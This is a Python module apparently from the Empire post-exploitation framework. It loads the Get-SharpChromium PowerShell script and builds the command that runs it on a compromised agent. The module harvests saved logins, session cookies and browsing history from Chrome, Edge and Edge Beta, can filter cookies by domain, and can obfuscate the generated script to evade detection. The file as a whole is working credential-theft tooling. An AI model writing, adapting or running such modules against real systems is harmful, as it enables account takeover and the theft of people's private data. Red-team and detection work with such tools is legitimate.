from __future__ import print_function
from builtins import str
from builtins import object
from lib.common import helpers

class Module(object):

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Get-SharpChromium',

            # list of one or more authors for the module
            'Author': ['@tyraniter'],

            # more verbose multi-line description of the module
            'Description': ('This module will retrieve cookies, history, saved logins from Google Chrome, Microsoft Edge, and Microsoft Edge Beta.'),

            'Software': '',

            'Techniques': ['T1503'],

            # True if the module needs to run in the background
            'Background' : True,

            'SaveOutput' : False,

            # File extension to save the file as
            'OutputExtension' : None,

            # True if the module needs admin rights to run
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : False,

            'Language' : 'powershell',

            'MinLanguageVersion' : '5',

            # list of any references/other comments
            'Comments': [
                'https://github.com/djhohnstein/SharpChromium'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to run the module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Type' : {
                'Description'   :   'Kind of data to be retrieved, should be "all", "logins", "history" or "cookies".',
                'Required'      :   True,
                'Value'         :   'all'
            },
            'Domains' : {
                'Description'   :   'Set with Type cookies, return only cookies matching those domains. Separate with ","',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu


        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):


        # if you're reading in a large, external script that might be updates,
        #   use the pattern below
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/collection/Get-SharpChromium.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        scriptEnd = " Get-SharpChromium"

        #check type
        if self.options['Type']['Value'].lower() not in ['all','logins','history','cookies']:
            print(helpers.color("[!] Invalid value of Type, use default value: all"))
            self.options['Type']['Value']='all'
        scriptEnd += " -Type "+self.options['Type']['Value']
        #check domain
        if self.options['Domains']['Value'].lower() != '':
            if self.options['Type']['Value'].lower() != 'cookies':
                print(helpers.color("[!] Domains can only be used with Type cookies"))
            else:
                scriptEnd += " -Domains ("
                for domain in self.options['Domains']['Value'].split(','):
                    scriptEnd += "'" + domain + "',"
                scriptEnd = scriptEnd[:-1]
                scriptEnd += ")"

        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
